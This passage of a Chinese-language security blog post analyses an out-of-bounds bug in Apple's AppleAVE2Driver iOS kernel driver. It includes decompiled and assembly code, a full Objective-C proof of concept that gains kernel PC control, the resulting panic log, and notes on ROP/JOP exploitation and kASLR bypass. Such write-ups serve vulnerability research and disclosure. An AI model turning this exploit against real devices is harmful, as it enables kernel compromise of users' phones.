<p>默认情况下，<code>statsMapBufferArray</code>中有5个<code>MEMORY_INFO</code>结构。由于每个大小为<code>0x28</code>，数组将占用<code>0xc8</code>字节。由于这个数组是在<code>AVEClient*</code>对象中内联的，当我们触发越界错误时，下一个<code>DeleteMemoryInfo</code>调用将使用<code>statsMapBufferArray</code>之后所有的数据。在我的<code>iPhone 8</code>的12.4内核上，这个数组的偏移量是<code>0x1b60</code>，也就是说第6项(第一个越界项)位于偏移量<code>0x1c28</code>处。</p>
<p>现在，还记得在<code>SetSessionSettings</code>中，如何将大块数据从用户控制的缓冲区复制到<code>AVEClient</code>对象中吗？恰好其中一个受控制缓冲区位于<code>statsMapBufferArray</code>字段之后!</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="built_in">AVEClient</span>       struc ; (<span class="keyword">sizeof</span>=<span class="number">0x29AC8</span>, align=<span class="number">0x8</span>, mappedto_215)</span><br><span class="line">[...]</span><br><span class="line"><span class="number">00001</span>B60 statsMapBufferArray DCB <span class="number">200</span> dup(?)</span><br><span class="line"><span class="number">00001</span>C28 sessionSettings_block1 DCB ?</span><br><span class="line">[...]</span><br><span class="line"><span class="comment">// Copies from the IOSurface buffer to a buffer adjacent to the statsMapBufferArray</span></span><br><span class="line">memmove(&amp;currentClient-&gt;sessionSettings_block1, buffMgrKernAddr, <span class="number">0x630</span>LL);</span><br></pre></td></tr></table></figure>

<p>因此，通过在复制到<code>AVEClient</code>的<code>IOSurface</code>缓冲区中提供精心构建的数据，我们完全可以控制越界数组条目。</p>
<h3 id="控制PC"><a href="#控制PC" class="headerlink" title="控制PC"></a>控制PC</h3><p>现在，我们看一下<code>AppleAVE2Driver::DeleteMemoryInfo</code>函数原型，记住我们对<code>memInfo</code>对象具有完全控制权限：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 AppleAVE2Driver::DeleteMemoryInfo(AppleAVE2Driver *<span class="variable language_">this</span>, IOSurfaceBufferMngr **memInfo)</span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( memInfo )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *memInfo )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = IOSurfaceBufferMngr::~IOSurfaceBufferMngr(*memInfo);</span><br><span class="line">      operator delete(v8);</span><br><span class="line">    &#125;</span><br><span class="line">    memset(memInfo, <span class="number">0</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">    result = <span class="number">0</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xE00002BC</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>IOSurfaceBufferMngr</code>的析构函数直接封装了一个静态的<code>IOSurfaceBufferMngr::RemoveBuffer</code>调用:</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IOSurfaceBufferMngr *IOSurfaceBufferMngr::~IOSurfaceBufferMngr(IOSurfaceBufferMngr *<span class="variable language_">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  IOSurfaceBufferMngr::RemoveBuffer(<span class="variable language_">this</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后<code>RemoveBuffer</code>调用<code>IOSurfaceBufferMngr::CompleteFence</code>，在本例中，汇编代码如下：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">IOSurfaceBufferMngr::CompleteFence(IOSurfaceBufferMngr *<span class="variable language_">this</span>)</span><br><span class="line"></span><br><span class="line">                STP             X20, X19, [SP,#<span class="number">-0x10</span>+var_10]!</span><br><span class="line">                STP             X29, X30, [SP,#<span class="number">0x10</span>+var_s0]</span><br><span class="line">                ADD             X29, SP, #<span class="number">0x10</span></span><br><span class="line">                MOV             X19, X0                         <span class="comment">// x19 = x0 (controlled pointer)</span></span><br><span class="line">                LDR             X0, [X0,#<span class="number">0x58</span>]                  <span class="comment">// Loads x0-&gt;0x58</span></span><br><span class="line">                CBZ             X0, exit_stub                   <span class="comment">// Exits if the value is zero </span></span><br><span class="line">                LDRB            W8, [X19,#<span class="number">0x1E</span>]                 <span class="comment">// Loads some byte at x19-&gt;0x1e</span></span><br><span class="line">                CBNZ            W8, exit_stub                   <span class="comment">// Exits if the byte is non-zero</span></span><br><span class="line">                MOV             W1, #<span class="number">0</span></span><br><span class="line">                BL              IOFence::complete</span><br><span class="line">                LDR             X0, [X19,#<span class="number">0x58</span>]                 <span class="comment">// Loads x19-&gt;0x58</span></span><br><span class="line">                LDR             X8, [X0]                        <span class="comment">// Loads x0-&gt;0x0</span></span><br><span class="line">                LDR             X8, [X8,#<span class="number">0x28</span>]                  <span class="comment">// Loads function pointer x8-&gt;0x28</span></span><br><span class="line">                BLR             X8                              <span class="comment">// Branches to fptr, giving arbitrary PC control</span></span><br><span class="line">                STR             XZR, [X19,#<span class="number">0x58</span>]</span><br><span class="line"></span><br><span class="line">exit_stub</span><br><span class="line">                LDP             X29, X30, [SP,#<span class="number">0x10</span>+var_s0]</span><br><span class="line">                LDP             X20, X19, [SP+<span class="number">0x10</span>+var_10],#<span class="number">0x20</span></span><br><span class="line">                RET</span><br></pre></td></tr></table></figure>

<p>本质上，通过创建一个<code>userland</code>共享缓冲区，可以触发一个越界访问，这将直接在关闭<code>userclient</code>时提供任意PC控制。</p>
<p>下面是这个漏洞的PoC，它将使设备崩溃，并导致取消对地址<code>0x4141414142424242</code>的引用:</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> kernel_bug_poc(io_connect_t ioconn, io_connect_t surface_ioconn)</span><br><span class="line">&#123;</span><br><span class="line">    kern_return_t ret;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> open_inputStruct[<span class="number">0x8</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="type">char</span> open_outputStruct[<span class="number">0x4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        size_t open_outputStruct_size = <span class="keyword">sizeof</span>(open_outputStruct);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// AppleAVE2UserClient::_my_open</span></span><br><span class="line">        ret = IOConnectCallStructMethod(ioconn, </span><br><span class="line">                                        <span class="number">0</span>, </span><br><span class="line">                                        open_inputStruct, </span><br><span class="line">                                        <span class="keyword">sizeof</span>(open_inputStruct), </span><br><span class="line">                                        open_outputStruct, </span><br><span class="line">                                        &amp;open_outputStruct_size);</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;my_open: %x %s&quot;</span>, ret, mach_error_string(ret));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create an IOSurface using the IOSurface client owned by MIDIServer</span></span><br><span class="line">    <span class="comment">// Address &amp; size of the shared mapping created by IOSurface and</span></span><br><span class="line">    <span class="comment">// returned in the output struct at offsets 0x0 and 0x1c respectively</span></span><br><span class="line">    uint64_t surface_map_addr = <span class="number">0x0</span>;</span><br><span class="line">    uint32_t surface_map_size = <span class="number">0x0</span>;</span><br><span class="line">    uint32_t surface_id = IOSurfaceRootUserClient_CreateSurface(surface_ioconn, &amp;surface_map_addr, &amp;surface_map_size);</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;Got Surface ID: %d&quot;</span>, surface_id);</span><br><span class="line"></span><br><span class="line">    uintptr_t surface_data = malloc(surface_map_size);</span><br><span class="line">    bzero((<span class="type">void</span> *)surface_data, surface_map_size);</span><br><span class="line"></span><br><span class="line">    *(uint64_t *)(surface_data + <span class="number">0x0</span>) = <span class="number">0x4141414142424242</span>;     <span class="comment">// First pointer to memory containing function pointer</span></span><br><span class="line">                                                                <span class="comment">// This field is the start of the block adjacent to the stats array</span></span><br><span class="line">    *(uint32_t *)(surface_data + <span class="number">0x3420</span>) = <span class="number">6</span>;                   <span class="comment">// `memoryInfoCnt2` field, gives 1 OOB access</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sends the data to MIDIServer to be written onto the IOSurface</span></span><br><span class="line">    <span class="comment">// The MIDIServer ROP chain hangs on the following call:</span></span><br><span class="line">    <span class="comment">// vm_read_overwrite(ourtask, clientbuf, surface1_map_size, surface1_map_addr, ...)</span></span><br><span class="line">    send_overwriting_iosurface_map(surface_data, surface_map_size, surface_map_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Waits for a message back from MIDIServer, sent by the ROP chain</span></span><br><span class="line">    <span class="comment">// Notifies us that the vm_read_overwrite call completed  </span></span><br><span class="line">    reply_notify_completion();</span><br><span class="line"></span><br><span class="line">    free(surface_data);</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Write the OOB count value to the `currentClient` object, and write our adjacent data</span></span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> setSessionSettings_inputStruct[<span class="number">0x108</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="type">char</span> setSessionSettings_outputStruct[<span class="number">0x4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        size_t setSessionSettings_outputStruct_size = <span class="keyword">sizeof</span>(setSessionSettings_outputStruct);</span><br><span class="line"></span><br><span class="line">        *(uint32_t *)(setSessionSettings_inputStruct + <span class="number">0x04</span>) = surface_id; <span class="comment">// FrameQueueSurfaceId</span></span><br><span class="line">        *(uint32_t *)(setSessionSettings_inputStruct + <span class="number">0x08</span>) = surface_id; <span class="comment">// InitInfoSurfaceId, vulnerable IOSurface mapping </span></span><br><span class="line">        *(uint32_t *)(setSessionSettings_inputStruct + <span class="number">0x0c</span>) = surface_id; <span class="comment">// ParameterSetsBuffer</span></span><br><span class="line">        *(uint32_t *)(setSessionSettings_inputStruct + <span class="number">0xd0</span>) = surface_id; <span class="comment">// codedHeaderCSID &amp; codedHeaderBuffer [0]</span></span><br><span class="line">        *(uint32_t *)(setSessionSettings_inputStruct + <span class="number">0xd4</span>) = surface_id; <span class="comment">// codedHeaderCSID &amp; codedHeaderBuffer [1]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// AppleAVE2UserClient::_SetSessionSettings </span></span><br><span class="line">        ret = IOConnectCallStructMethod(ioconn, </span><br><span class="line">                                        <span class="number">7</span>, </span><br><span class="line">                                        setSessionSettings_inputStruct, </span><br><span class="line">                                        <span class="keyword">sizeof</span>(setSessionSettings_inputStruct), </span><br><span class="line">                                        setSessionSettings_outputStruct, </span><br><span class="line">                                        &amp;setSessionSettings_outputStruct_size);</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;SetSessionSettings: %x %s&quot;</span>, ret, mach_error_string(ret));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Trigger the bug </span></span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> close_inputStruct[<span class="number">0x4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="type">char</span> close_outputStruct[<span class="number">0x4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        size_t close_outputStruct_size = <span class="keyword">sizeof</span>(close_outputStruct);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// AppleAVE2UserClient::_my_close </span></span><br><span class="line">        ret = IOConnectCallStructMethod(ioconn, </span><br><span class="line">                                        <span class="number">1</span>, </span><br><span class="line">                                        close_inputStruct, </span><br><span class="line">                                        <span class="keyword">sizeof</span>(close_inputStruct), </span><br><span class="line">                                        close_outputStruct, </span><br><span class="line">                                        &amp;close_outputStruct_size);</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;my_close: %x %s&quot;</span>, ret, mach_error_string(ret));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>log：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">panic(cpu <span class="number">5</span> caller <span class="number">0xfffffff007205df4</span>): Kernel data abort. (saved state: <span class="number">0xffffffe03cafaf40</span>)</span><br><span class="line">      x0: <span class="number">0x4141414142424242</span>  x1:  <span class="number">0xffffffe02cb09c28</span>  x2:  <span class="number">0x0000000000000000</span>  x3:  <span class="number">0xffffffe02cb09c28</span></span><br><span class="line">      x4: <span class="number">0x0000000000000000</span>  x5:  <span class="number">0x0000000000000000</span>  x6:  <span class="number">0xfffffff00f35bb54</span>  x7:  <span class="number">0x0000000000000000</span></span><br><span class="line">      x8: <span class="number">0x0000000000000006</span>  x9:  <span class="number">0x0000000000000006</span>  x10: <span class="number">0x0000000000000001</span>  x11: <span class="number">0x0000000000080022</span></span><br><span class="line">      x12: <span class="number">0x0000000000000022</span> x13: <span class="number">0xffffffe00094bc08</span>  x14: <span class="number">0x0000000000080023</span>  x15: <span class="number">0x0000000000006903</span></span><br><span class="line">      x16: <span class="number">0xfffffff00ee71740</span> x17: <span class="number">0x0000000000000000</span>  x18: <span class="number">0xfffffff00ee79000</span>  x19: <span class="number">0x4141414142424242</span></span><br><span class="line">      x20: <span class="number">0xffffffe02cb08000</span> x21: <span class="number">0x0000000000000000</span>  x22: <span class="number">0xffffffe02cb09c28</span>  x23: <span class="number">0x0000000000000005</span></span><br><span class="line">      x24: <span class="number">0xffffffe02cb2f748</span> x25: <span class="number">0xffffffe02cb0d034</span>  x26: <span class="number">0x0000000000000050</span>  x27: <span class="number">0xffffffe004929218</span></span><br><span class="line">      x28: <span class="number">0x0000000000000000</span> fp:  <span class="number">0xffffffe03cafb2a0</span>  lr:  <span class="number">0xfffffff0069397e8</span>  sp:  <span class="number">0xffffffe03cafb290</span></span><br><span class="line">      pc:  <span class="number">0xfffffff0069398dc</span> cpsr: <span class="number">0x80400304</span>         esr: <span class="number">0x96000004</span>          far: <span class="number">0x414141414242429a</span></span><br></pre></td></tr></table></figure>

<p>可以看到<code>pc</code>对齐是在<code>x0-&gt;0x58</code>指令之前的分支:</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xFFFFFFF0069398CC</span> IOSurfaceBufferMngr::CompleteFence</span><br><span class="line"><span class="number">0xFFFFFFF0069398CC</span></span><br><span class="line"><span class="number">0xFFFFFFF0069398CC</span>                 STP             X20, X19, [SP,#<span class="number">-0x10</span>+var_10]!</span><br><span class="line"><span class="number">0xFFFFFFF0069398D0</span>                 STP             X29, X30, [SP,#<span class="number">0x10</span>+var_s0]</span><br><span class="line"><span class="number">0xFFFFFFF0069398D4</span>                 ADD             X29, SP, #<span class="number">0x10</span></span><br><span class="line"><span class="number">0xFFFFFFF0069398D8</span>                 MOV             X19, X0</span><br><span class="line"><span class="number">0xFFFFFFF0069398DC</span>                 LDR             X0, [X0,#<span class="number">0x58</span>]                 <span class="comment">// Faults here </span></span><br><span class="line"><span class="number">0xFFFFFFF0069398E0</span>                 CBZ             X0, loc_FFFFFFF006939908</span><br><span class="line"><span class="number">0xFFFFFFF0069398E4</span>                 LDRB            W8, [X19,#<span class="number">0x1E</span>]</span><br><span class="line"><span class="number">0xFFFFFFF0069398E8</span>                 CBNZ            W8, loc_FFFFFFF006939908</span><br><span class="line"><span class="number">0xFFFFFFF0069398EC</span>                 MOV             W1, #<span class="number">0</span></span><br><span class="line"><span class="number">0xFFFFFFF0069398F0</span>                 BL              IOFence__complete</span><br><span class="line"><span class="number">0xFFFFFFF0069398F4</span>                 LDR             X0, [X19,#<span class="number">0x58</span>]</span><br><span class="line"><span class="number">0xFFFFFFF0069398F8</span>                 LDR             X8, [X0]</span><br><span class="line"><span class="number">0xFFFFFFF0069398FC</span>                 LDR             X8, [X8,#<span class="number">0x28</span>]</span><br><span class="line"><span class="number">0xFFFFFFF006939900</span>                 BLR             X8</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><p>一旦逃逸了沙盒，利用这个漏洞就非常简单。</p>
<p>PoC中的代码也可用于EXP，但是<code>SetSessionSettings</code>缓冲区(<code>0x4141414142424242</code>)中提供的值必须指向可控的内核缓冲区，可以从该缓冲区加载函数指针。另外一个堆信息泄漏的漏洞可以用于稳定性保证。在kASLR失败的情况下，还可以根据每个设备推测堆的位置:在堆内存高地址测试下，大量的分配很可能会在相同的内存范围(<code>0xffffffffe1xxxxxxxx</code>)。</p>
<p>因为这个漏洞可以让我们控制PC，所以它可以通过ROP或JOP进行利用。虽然不一定适用于有PAC的A12或更新版本的设备，但非A12&#x2F;A13是支持我们沙盒逃逸，还要注意，在构建ROP&#x2F;JOP链时，可控内核缓冲区的地址在x19内，另一个可控指针在x0内，可以用作stack pivot或暂存内存空间。</p>
<p>反弹shell <a target="_blank" rel="noopener" href="https://github.com/ssd-secure-disclosure/advisories/tree/master/SSD%20Advisory%20-%204066/poc">POC</a>。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/195619">https://www.anquanke.com/post/id/195619</a></p>
</blockquote>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/page/46/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/46/">46</a><span class="page-number current">47</span><a class="page-number" href="/page/48/">48</a><span class="space">&hellip;</span><a class="page-number" href="/page/56/">56</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/48/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">buffer0verflooow</span>
  </div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
